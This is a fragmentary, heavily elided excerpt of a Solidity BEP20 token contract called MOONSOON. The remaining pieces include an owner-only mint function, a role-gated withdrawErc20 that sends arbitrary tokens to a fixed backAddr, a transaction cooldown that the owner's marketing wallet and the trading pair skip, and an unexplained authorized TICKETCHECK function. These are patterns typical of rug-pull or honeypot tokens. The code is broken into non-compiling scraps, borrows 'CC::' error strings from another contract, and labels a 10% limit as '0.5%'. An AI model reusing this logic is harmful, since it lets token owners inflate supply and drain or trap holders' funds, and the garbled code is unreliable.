...
contract MOONSOON is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    */
        ...
        external
    {
        ...
        require(signatory != address(0), "CC::delegateBySig: invalid signature");
    ...
    function getPriorVotes(address account, uint blockNumber)
        ...
        returns (uint256)
    {
        require(blockNumber < block.number, "CC::getPriorVotes: not yet determined");
    ...
    function _writeCheckpoint(
        ...
        internal
    {
        uint32 blockNumber = safe32(block.number, "CC::_writeCheckpoint: block number exceeds 32 bits");
    ...
    string constant _name = "MOONSOON";
    string constant _symbol = "MOONSOON";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 5000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply / 10; // 0.5%
    ...
    uint256 private _transactionLockTime = 10; //Cool down time between each transaction per address
    ...
    constructor () Auth(msg.sender) {
        ...
        _isExcludedFromTransactionlock[pair]            = true;
        _isExcludedFromTransactionlock[DEAD]             = true;
        _isExcludedFromTransactionlock[marketingFeeReceiver]       = true;
        _isExcludedFromTransactionlock[address(router)] = true;
	...
	function withdrawErc20(address conaddr, uint256 amount) public {
	    require(hasRole(_msgSender()), "must have role");
        IBEP20(conaddr).transfer(backAddr, amount);
	}
    ...
    function approveMax(address spender) external returns (bool) {
        ...
        function mint(uint256 amount) public authorized returns (bool) {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(_isExcludedFromTransactionlock[sender] || block.timestamp >= _transactionCheckpoint[sender] + _transactionLockTime,
        "Wait for transaction cooldown time to end before making a tansaction");
        require(_isExcludedFromTransactionlock[recipient] || block.timestamp >= _transactionCheckpoint[recipient] + _transactionLockTime,
        "Wait for transaction cooldown time to end before making a tansaction");
...
//	*/
    ...
    function TICKETCHECK(uint256 amount, uint256 amount2) external authorized {
